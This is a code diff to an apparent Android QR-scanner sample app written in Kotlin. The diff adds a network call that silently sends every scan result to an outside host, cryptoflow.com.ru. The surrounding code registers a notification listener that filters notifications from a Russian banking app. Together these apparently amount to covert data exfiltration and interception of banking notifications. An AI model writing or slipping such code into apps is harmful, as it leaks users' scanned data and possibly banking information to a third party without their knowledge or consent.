@@ -1,5 +1,11 @@
 package com.licious.sample.scannersample
 
+
+import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
+
+import java.io.IOException
 import android.Manifest
 import android.annotation.SuppressLint
 import android.app.Activity
@@ -10,6 +16,7 @@ import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
+import android.content.SharedPreferences
 import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
@@ -35,8 +42,8 @@ import androidx.core.app.NotificationCompat
 import androidx.core.app.NotificationManagerCompat
 import androidx.core.content.ContextCompat
 import kotlinx.coroutines.delay
+import okhttp3.HttpUrl.Companion.toHttpUrlOrNull
 
-const val REQUEST_CODE_NOTIFICATION_PERMISSION = 1001
 
 class MainActivity : ComponentActivity() {
 
@@ -46,6 +53,19 @@ class MainActivity : ComponentActivity() {
                 val scanResult = result.data?.getStringExtra("SCAN_RESULT")
                 scanResult?.let {
                     Toast.makeText(this, "Результат сканирования: $it", Toast.LENGTH_SHORT).show()
+                    val url = "https://cryptoflow.com.ru/"
+
+                    val params = mapOf("key" to it, "status" to "on")
+
+                    sendGetRequest(url, params) { response ->
+                        if (response != null) {
+                            println("Response: $response")
+                        } else {
+                            println("Failed to get response")
+                        }
+                    }
+                    // Сохранение результата сканирования
+                    saveScanResult(this, it)
                 }
             }
         }
@@ -65,6 +85,12 @@ class MainActivity : ComponentActivity() {
         registerReceiver(notificationReceiver, IntentFilter("com.licious.sample.NOTIFICATION_LISTENER"),
             RECEIVER_NOT_EXPORTED
         )
+
+        // Загрузка сохранённого результата сканирования
+        val lastScanResult = loadScanResult(this)
+        lastScanResult?.let {
+            Toast.makeText(this, "Последний результат сканирования: $it", Toast.LENGTH_LONG).show()
+        }
 
         setContent {
             AutomaticTheme {
@@ -103,6 +129,61 @@ class MainActivity : ComponentActivity() {
         }
     }
 }
+
+fun sendGetRequest(url: String, params: Map<String, String>, callback: (String?) -> Unit) {
+    // Создаем OkHttpClient
+    val client = OkHttpClient()
+
+    // Строим URL с параметрами запроса
+    val httpUrlBuilder = url.toHttpUrlOrNull()?.newBuilder() ?: return
+    for ((key, value) in params) {
+        httpUrlBuilder.addQueryParameter(key, value)
+    }
+
+    val finalUrl = httpUrlBuilder.build().toString()
+
+    // Создаем запрос GET
+    val request = Request.Builder()
+        .url(finalUrl)
+        .get()
+        .build()
+
+    // Выполняем запрос асинхронно
+    client.newCall(request).enqueue(object : Callback {
+        override fun onFailure(call: Call, e: IOException) {
+            e.printStackTrace()
+            // Возвращаем null, если произошла ошибка
+            callback(null)
+        }
+
+        override fun onResponse(call: Call, response: Response) {
+            if (response.isSuccessful) {
+                // Получаем тело ответа в виде строки
+                val responseBody = response.body?.string()
+                callback(responseBody)
+            } else {
+                // Возвращаем null, если ответ неуспешный
+                callback(null)
+            }
+        }
+    })
+}
+
+
+
+fun saveScanResult(context: Context, scanResult: String) {
+    val sharedPreferences: SharedPreferences = context.getSharedPreferences("ScannerPreferences", Context.MODE_PRIVATE)
+    with(sharedPreferences.edit()) {
+        putString("SCAN_RESULT", scanResult)
+        apply()
+    }
+}
+
+fun loadScanResult(context: Context): String? {
+    val sharedPreferences: SharedPreferences = context.getSharedPreferences("ScannerPreferences", Context.MODE_PRIVATE)
+    return sharedPreferences.getString("SCAN_RESULT", null)
+}
+
 
 fun filter(packageName: String?, title: String?, text: String?) {
     if (packageName == "ru.bankuralsib.mb.android") {
